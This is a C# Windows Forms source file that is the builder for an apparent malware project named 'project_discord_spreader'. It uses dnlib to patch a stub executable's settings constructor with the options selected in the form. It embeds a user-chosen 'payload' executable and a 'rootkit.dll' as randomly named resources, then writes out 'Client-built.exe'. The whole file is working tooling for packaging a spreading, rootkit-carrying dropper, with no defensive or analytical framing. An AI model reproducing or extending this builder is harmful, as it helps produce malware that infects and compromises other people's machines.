using System;
using System.Data;
using System.Linq;
using System.IO;
using System.Windows.Forms;
using dnlib.DotNet;

namespace builder
{
    public partial class Builder : Form
    {
        public Builder()
        {
            InitializeComponent();
        }
        string filepath = "";
        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked)
            {
                checkBox7.Visible = true;
            }
            else 
            {
                checkBox7.Visible = false;
                checkBox7.Checked = false;
                checkBox8.Visible = false;
                checkBox8.Checked = false;
            }
        }

        private void checkBox7_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox7.Checked)
            {
                checkBox8.Visible = true;
            }
            else
            {
                checkBox8.Visible = false;
                checkBox8.Checked = false;
            }
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox5.Checked)
            {
                label2.Visible = true;
                textBox1.Visible = true;
                label1.Visible = true;
                textBox2.Visible = true;
                label3.Visible = true;
            }
            else
            {
                label2.Visible = false;
                textBox1.Visible = false;
                textBox1.Text = "";
                label1.Visible = false;
                textBox2.Visible = false;
                textBox2.Text = "";
                label3.Visible = false;
            }
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox6.Checked)
            {
                label4.Visible = true;
                button1.Visible = true;
                label5.Visible = true;
            }
            else
            {
                button1.Visible = false;
                label4.Visible = false;
                label4.Text = "Payload selected: None";
                label5.Visible = false;
                label5.Text = "Payload added: False";
                filepath = "";
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {

            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Exe Files (.exe)|*.exe";
                openFileDialog.FilterIndex = 1;
                openFileDialog.RestoreDirectory = true;
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    filepath = openFileDialog.FileName;
                    label4.Text = "Payload selected:" + Path.GetFileName(filepath);
                    label5.Text = "Payload added: True";
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string rootkitpath = Environment.CurrentDirectory + "\\resources\\" + "rootkit.dll";
            string outpath = Environment.CurrentDirectory + "\\Client-built.exe";
            string stub = Environment.CurrentDirectory + "\\resources\\" + "stub.exe";
            string FullName = "project_discord_spreader.settings";
            var Assembly = AssemblyDef.Load(stub);
            var Module = Assembly.ManifestModule;
            if (Module != null)
            {
                var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                if (Settings != null)
                {
                    var Constructor = Settings.FindMethod(".cctor");
                    if (Constructor != null)
                    {
                        if (checkBox6.Checked) 
                        {
                            string temp = Path.GetRandomFileName();
                            while (temp.Contains("rootkit"))
                            {
                                temp = Path.GetRandomFileName();
                            }
                            Module.Resources.Add(new EmbeddedResource(temp, File.ReadAllBytes(filepath)));
                        }
                        if (checkBox4.Checked) 
                        {
                            Module.Resources.Add(new EmbeddedResource(Path.GetRandomFileName() + "rootkit", File.ReadAllBytes(rootkitpath)));
                        }
                        string text = "";
                        if (textBox1.Text.Trim() == "") { text = "game"; } else { text = textBox1.Text.Trim(); }
                        Constructor.Body.Instructions[0].Operand = checkBox1.Checked.ToString() ;
                        Constructor.Body.Instructions[2].Operand = checkBox2.Checked.ToString(); 
                        Constructor.Body.Instructions[4].Operand = checkBox3.Checked.ToString(); 
                        Constructor.Body.Instructions[6].Operand = checkBox7.Checked.ToString(); 
                        Constructor.Body.Instructions[8].Operand = checkBox8.Checked.ToString(); 
                        Constructor.Body.Instructions[10].Operand = checkBox4.Checked.ToString(); 
                        Constructor.Body.Instructions[12].Operand = checkBox5.Checked.ToString(); 
                        Constructor.Body.Instructions[14].Operand = textBox2.Text.Trim(); 
                        Constructor.Body.Instructions[16].Operand = text + ".exe";
                        Constructor.Body.Instructions[20].Operand = checkBox6.Checked.ToString();
                        try
                        {
                            Assembly.Write(outpath);
                            MessageBox.Show("built to: " + outpath);
                        }catch (Exception b)
                        {
                            MessageBox.Show("ERROR: " + b);
                        }
                    }
                }
            }
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
